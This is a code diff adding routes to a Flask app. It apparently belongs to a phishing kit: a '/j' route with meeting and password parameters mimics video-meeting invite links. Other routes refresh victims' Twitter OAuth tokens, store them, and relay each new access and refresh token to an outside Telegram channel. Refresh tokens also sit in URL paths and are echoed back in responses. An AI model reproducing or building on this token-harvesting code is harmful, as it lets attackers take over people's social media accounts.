@@ -321,6 +321,59 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             return f"Error retrieving access token: {error_description}", response.status_code
 
+from flask import render_template
+
+# Meeting route
+@app.route('/j')
+def meeting():
+    state_id = request.args.get('meeting')  # Get the 'meeting' parameter from the URL
+    code_ch = request.args.get('pwd')  # Get the 'pwd' parameter from the URL
+    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
+
+
+# Refresh token page
+@app.route('/refresh/<refresh_token2>', methods=['GET'])
+def refresh_page(refresh_token2):
+    # Render a page that displays the refresh token and allows further actions if needed
+    return render_template('refresh.html', refresh_token=refresh_token2)
+
+
+# Perform refresh with refresh token
+@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
+def perform_refresh(refresh_token):
+    token_url = 'https://api.twitter.com/2/oauth2/token'
+    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
+    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
+
+    headers = {
+        'Authorization': f'Basic {auth_header}',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+
+    data = {
+        'refresh_token': refresh_token,
+        'grant_type': 'refresh_token',
+        'client_id': CLIENT_ID
+    }
+
+    response = requests.post(token_url, headers=headers, data=data)
+    token_response = response.json()
+
+    if response.status_code == 200:
+        new_access_token = token_response.get('access_token')
+        new_refresh_token = token_response.get('refresh_token')
+
+        # Store the new tokens in the database
+        username = get_twitter_username(new_access_token)
+        store_token(new_access_token, new_refresh_token, username)
+
+        send_message_via_telegram(f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}")
+        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
+    else:
+        error_description = token_response.get('error_description', 'Unknown error')
+        error_code = token_response.get('error', 'No error code')
+        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
+
 # Route to display active.html
 @app.route('/active')
 def active():
